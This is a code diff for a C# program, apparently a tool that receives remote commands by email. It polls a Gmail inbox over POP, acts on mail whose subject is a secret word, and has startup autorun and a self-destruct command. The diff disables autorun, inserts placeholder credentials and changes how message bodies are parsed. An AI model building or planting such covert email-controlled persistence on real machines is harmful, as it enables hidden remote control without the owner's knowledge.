@@ -6,6 +6,7 @@ using System.Net.Mail;
 using System.Reflection;
 using System.Security;
 using System.Security.Permissions;
+using System.Text;
 using System.Threading;
 using Microsoft.Win32;
 using OpenPop.Mime;
@@ -18,11 +19,11 @@ namespace RCM
         static void Main(string[] args)
         {
             //Call function to make this program run automatic on start up
-            bool autorun = true;
+            bool autorun = false;
 
             //data of email, where app will be listening
-            string username = "USERNAME@gmail.com";
-            string password = "PASSWORD";
+            string username = "username@gmail.com";
+            string password = "password";
 
             //data to receive mails
             string hostname = "pop.gmail.com";
@@ -90,8 +91,18 @@ namespace RCM
                     if (subject == secret) //if the mail has the secret word in the Subject
                     {
                         string mid = s.Headers.MessageId.ToString().Trim(); //Get ID of the message
-                        string content = s.MessagePart.MessageParts[0].GetBodyAsText().Trim(); //Get the body of the message
-
+                        
+                        OpenPop.Mime.MessagePart plainText = s.FindFirstPlainTextVersion();
+                        StringBuilder builder = new StringBuilder();
+                        if(plainText != null)
+                        {
+                            // We found some plaintext!
+                            builder.Append(plainText.GetBodyAsText());
+                        }
+                        string content = builder.ToString().Trim();
+                        
+                       // int len = s.MessagePart.MessageParts.Count;
+                        //content += s.MessagePart.MessageParts[0].GetBodyAsText(); //Get the body of the message
                         if (!String.IsNullOrEmpty(content))
                         {
                             if (content == destroyMe) //if the destroy was required
